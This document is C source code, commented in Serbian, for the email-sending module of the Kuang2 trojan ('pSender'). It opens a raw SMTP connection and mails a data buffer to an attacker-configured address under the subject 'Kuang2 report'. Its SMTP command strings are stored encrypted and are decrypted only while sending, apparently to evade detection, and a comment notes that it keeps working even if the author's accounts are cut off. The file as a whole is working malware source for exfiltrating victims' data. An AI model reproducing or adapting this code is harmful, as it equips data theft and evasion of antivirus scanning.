/***[ThuNderSoft]*************************************************************
						   KUANG2 pSender: send_data
								     WEIRD
*****************************************************************************/

#define W_FAST_ONLY

#include <windows.h>
#include <win95e.h>
#include <winsock.h>
#include <strmem.h>
#include <tools.h>
#include <mathw.h>

#define RLEN 1024
extern char temp[];		// ovo nam je slobodno kada se poziva send_data
						// pa će to biti bafer za prihvatanje poruka sa
						// smtp servera

// ovde se unosi spolja adresa servera, ne zaboravi da dodaš '\r\n'
static char helo[50]={		// "HELO "
	0x84, 0x54, 0xC4, 0xF4, 0x02, 0x00};
char *smtp_server=&helo[5];

static char data[]={		// "DATA\r\n"
	0x44, 0x14, 0x45, 0x14, 0xA0, 0xD0, 0x00};

static char quit[]={		// "QUIT\r\n"
	0x15, 0x55, 0x94, 0x45, 0xA0, 0xD0, 0x00};

static char header[]={		// "SUBJECT: Kuang2 report\r\nFROM: ku@ng.pSender\r\n\r\n"
	0x35, 0x55, 0x24, 0xA4, 0x54, 0x34, 0x45, 0xA3, 0x02, 0xB4, 0x57, 0x16,\
	0xE6, 0x76, 0x23, 0x02, 0x27, 0x56, 0x07, 0xF6, 0x27, 0x47, 0xD0, 0xA0,\
	0x64, 0x25, 0xF4, 0xD4, 0xA3, 0x02, 0xB6, 0x57, 0x04, 0xE6, 0x76, 0xE2,\
	0x07, 0x35, 0x56, 0xE6, 0x46, 0x56, 0x27, 0xD0, 0xA0, 0xD0, 0xA0, 0x00};

static char mailfrom[55]={		// "MAIL FROM:<ku@ng2>\r\n"
	0xD4, 0x14, 0x94, 0xC4, 0x02, 0x64, 0x25, 0xF4, 0xD4, 0xA3, 0xC3,\
	0xB6, 0x57, 0x04, 0xE6, 0x76, 0x23, 0x00};

// ovde se unosi spolja adresa korisnika, ne zaboravi da dodaš '>\r\n'
static char rcptto[55]={		// "RCPT TO:<"
	0x25, 0x34, 0x05, 0x45, 0x02, 0x45, 0xF4, 0xA3, 0xC3, 0x00};

static char addrend[]=">\r\n";
static char *cmdend=&addrend[1];

/*
	answer
	------
  + čita recive bafer (temp) i prva tri karaktera pretvara u broj koji
	predstavlja odgovor smtp servera. */

int answer(void) {
	return ( (temp[0]-48)*100 + (temp[1]-48)*10 + temp[2]-48 );
}


/*
	send_hard
	---------
  + Radi samo slanje poruke. Imena hostova i slično se prethodno definišu.
  + Ako je sve prošlo kako treba vraća 0, u suprotnom neku grešku.
	1 -> greška u komunikaciji...
	2 -> ozbiljna greška - server nije dobar ili ne može da se konektuje.
  + uoči da ako mi ukinu username na tim serverima i dalje će da radi
	ovo sranje... osim ako ne promene ime servera :) */

int send_hard (char *poruka)
{
	SOCKET S;
	unsigned int i,j,k;
	struct hostent *H;
	struct sockaddr_in A;

	// Kreiramo Socket - Internet familija, Stream tip
	S=socket(AF_INET, SOCK_STREAM, 0);
	if (S==INVALID_SOCKET) return 2;	// err: ne može da otvori socket
	A.sin_family=AF_INET;				// familija: Internet
	A.sin_port=htons(25);				// port 25: SMTP protokol

	H=gethostbyname(smtp_server);		// nađi IP smtp servera
	if (H==NULL) {						// ako ne može da resolve možda je...
		i=inet_addr(smtp_server);		// ...dat IP broj
		if (i==INADDR_NONE) return 2;	// ipak greška
		A.sin_addr.s_addr=i;
	} else {
		A.sin_addr.s_addr=*(unsigned long *)H->h_addr;	// preuzmi IP adresu
	}

	// Priključi se na server
	i=connect(S, (struct sockaddr *) &A, sizeof(struct sockaddr) );
	if (i) return 2;					// ne može da se prikjuči na server

	i=0;								// oznaka da je sve dobro prošlo

	recv(S, temp, RLEN, 0);						// S: 220 Service Ready
	if (answer()!=220) {i=1; goto send_end;}	// greška

	strcopyF(temp, helo); straddF(temp, cmdend);
	send(S, temp, strlengthF(temp), 0);			// C: HELO sender_domain
	recv(S, temp, RLEN, 0);						// S: 250 OK
	if (answer()!=250) {i=1; goto send_end;}	// greška

	strcopyF(temp, mailfrom); straddF(temp, addrend);
	send(S, temp, strlengthF(temp), 0);			// C: MAIL FROM: <reverse_path>
	recv(S, temp, RLEN, 0);						// S: 250 OK
	if (answer()!=250) {i=1; goto send_end;}	// greška

	strcopyF(temp, rcptto); straddF(temp, addrend);
	send(S, temp, strlengthF(temp), 0);			// C: RCPT TO: <forward_path>
	recv(S, temp, RLEN, 0);						// S: 250 OK
	if (answer()!=250) {i=1; goto send_end;}	// greška

	send(S, data, strlengthF(data), 0);			// C: DATA
	recv(S, temp, RLEN, 0);						// S: 354 Start mail input
	if (answer()!=354) {i=1; goto send_end;};	// greška

	send(S, header, strlengthF(header), 0);		// C: poruka (nema response)

//	send(S, poruka, strlengthF(poruka), 0);		// C: poruka (nema response)
	k=strlengthF(poruka); j=0;
	while (k>1024) {
		send(S, &poruka[j], 1024, 0);			// pošalji 1 KB poruke
		k-=1024; j+=1024;
	}
	send(S, &poruka[j], k, 0);					// C: ostatak poruke


	send(S, "\r\n.\r\n", 5, 0);                 // C: <CRLF>.<CRLF>
	recv(S, temp, RLEN, 0);						// S: 250 OK
	if (answer()!=250) {i=1; goto send_end;}	// greška

send_end:
	send(S, quit, strlengthF(quit), 0);			// C: QUIT
	recv(S, temp, RLEN, 0);						// R: 221 Closing Connection
												// za ovo nam ne treba provera greški

	closesocket(S);
	return i;		// i!=0 -> greška; i==0 sve je ok
}


/*
	send_data
	---------
  + šalje bafer (string) na e-mail
  + ako je sve prošlo kako treba vraća 0! */

int send_data(char *b)
{
	unsigned int i;

	// dekriptovanje
	strdecryptS(helo);
	strdecryptS(header);
	strdecryptS(mailfrom);
	strdecryptS(rcptto);
	strdecryptS(data);
	strdecryptS(quit);

	i=send_hard(b);

	// ponovo kriptuj
	strcryptS(helo);
	strcryptS(header);
	strcryptS(mailfrom);
	strcryptS(rcptto);
	strcryptS(data);
	strcryptS(quit);

	return i;		// 0 ako je uspelo, {1,2} ako nije
}
